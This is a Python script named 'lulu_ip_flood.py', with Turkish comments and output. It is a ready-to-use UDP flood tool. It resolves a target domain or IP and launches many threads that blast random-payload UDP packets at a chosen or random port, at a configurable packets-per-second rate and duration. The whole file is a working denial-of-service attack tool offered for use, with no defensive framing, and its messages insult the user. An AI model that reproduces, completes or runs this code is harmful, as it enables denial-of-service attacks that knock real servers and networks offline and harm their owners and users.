# dosya: lulu_ip_flood.py
# Lulu IP Flood - Terminalden kontrol - Ekran temizleme özelliği eklendi

import socket
import random
import threading
import time
import sys
import argparse
import os

# EKRANI TEMİZLE - script başlar başlamaz
os.system('clear')

# Renkler Termux için
R = '\033[31m'
G = '\033[32m'
Y = '\033[33m'
C = '\033[36m'
W = '\033[0m'

def resolve_target(target):
    """Domain veya IP'yi IP'ye çevir"""
    if target.replace(".", "").replace(":", "").isdigit() or ':' in target:
        return target
    try:
        ip = socket.gethostbyname(target)
        print(f"{G}[+] Domain çözüldü: {target} → {ip}{W}")
        return ip
    except socket.gaierror:
        print(f"{R}[-] Domain çözülemedi: {target} → Çıkış yapılıyor.{W}")
        sys.exit(1)

def udp_flood_thread(thread_id, target_ip, target_port, duration, target_interval, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(packet_size)
    
    packets_sent = 0
    start_time = time.time()
    
    while time.time() - start_time < duration:
        try:
            port = random.randint(1, 65535) if target_port == 0 else target_port
            sock.sendto(payload, (target_ip, port))
            packets_sent += 1
            
            if target_interval > 0:
                time.sleep(target_interval)
                
        except:
            pass
    
    elapsed = time.time() - start_time
    if packets_sent > 0:
        real_pps = packets_sent / elapsed
        print(f"{Y}[Thread {thread_id}]{W} Bitti → {packets_sent:,} paket | Gerçek hız \~{real_pps:.0f} PPS")

def main():
    # Argümanları parse etmeden önce tekrar temizlik (bazı durumlarda lazım olur)
    # os.system('clear')  # istersen buraya da koyabilirsin ama genelde ilk temizlik yeter

    parser = argparse.ArgumentParser(description=f"{R}LULU IP FLOOD - Terminalden kontrol{W}")
    parser.add_argument("--ip", help="Hedef IP adresi (örn: 1.1.1.1)")
    parser.add_argument("--domain", help="Hedef domain (örn: example.com) - otomatik IP çözülür")
    parser.add_argument("--port", type=int, default=80, help="Hedef port (default: 80, 0 = random port)")
    parser.add_argument("--pps", type=int, default=5000, help="Hedef paket/saniye (default: 5000)")
    parser.add_argument("--duration", type=int, default=300, help="Saldırı süresi saniye (default: 300)")
    parser.add_argument("--threads", type=int, default=120, help="Thread sayısı (default: 120)")
    parser.add_argument("--size", type=int, default=1470, help="Paket boyutu byte (default: 1470)")

    args = parser.parse_args()

    if not args.ip and not args.domain:
        parser.print_help()
        print(f"\n{R}Hata: En azından --ip veya --domain girmelisin piç!{W}")
        sys.exit(1)

    target_ip = resolve_target(args.ip or args.domain)
    target_port = args.port
    duration = args.duration
    desired_pps = args.pps
    thread_count = args.threads
    packet_size = min(args.size, 1472)  # UDP max güvenli

    per_thread_pps = desired_pps / thread_count if thread_count > 0 else 0
    target_interval = 1.0 / per_thread_pps if per_thread_pps > 0 else 0

    print(f"""
{R}██╗     ██╗   ██╗██╗     ██╗   ██╗    ███████╗██╗      ██████╗  ██████╗ ██████╗ 
██║     ██║   ██║██║     ██║   ██║    ██╔════╝██║     ██╔═══██╗██╔════╝ ██╔══██╗
██║     ██║   ██║██║     ██║   ██║    █████╗  ██║     ██║   ██║██║  ███╗██████╔╝
██║     ██║   ██║██║     ██║   ██║    ██╔══╝  ██║     ██║   ██║██║   ██║██╔══██╗
███████╗╚██████╔╝███████╗╚██████╔╝    ███████╗███████╗╚██████╔╝╚██████╔╝██║  ██║
╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝     ╚══════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝{W}

              Lulu IP Flood - Terminal Kontrollü 2026
Hedef IP → {Y}{target_ip}{W}   Port → {Y}{target_port if target_port else 'RANDOM'}{W}
Hedef PPS → {Y}{desired_pps:,}{W}   Thread → {Y}{thread_count}{W}   Süre → {Y}{duration}s{W}
Paket boyutu → {Y}{packet_size} byte{W}
Thread başına interval → \~{target_interval*1000:.2f} ms
""")

    threads = []
    for i in range(thread_count):
        t = threading.Thread(
            target=udp_flood_thread,
            args=(i+1, target_ip, target_port, duration, target_interval, packet_size)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    print(f"{C}[*] {desired_pps:,} PPS hedefiyle saldırı başladı... Ctrl+C ile dur{W}\n")

    try:
        time.sleep(duration + 2)  # biraz taşma payı
    except KeyboardInterrupt:
        print(f"\n{R}[X] Saldırı kesildi. {desired_pps * duration:,} paket hedeflenmişti, bye piç.{W}")
        sys.exit(0)

    print(f"\n{G}[✔] Süre doldu. Yaklaşık {desired_pps * duration:,} paket fırlatıldı.{W}")

if __name__ == "__main__":
    main()
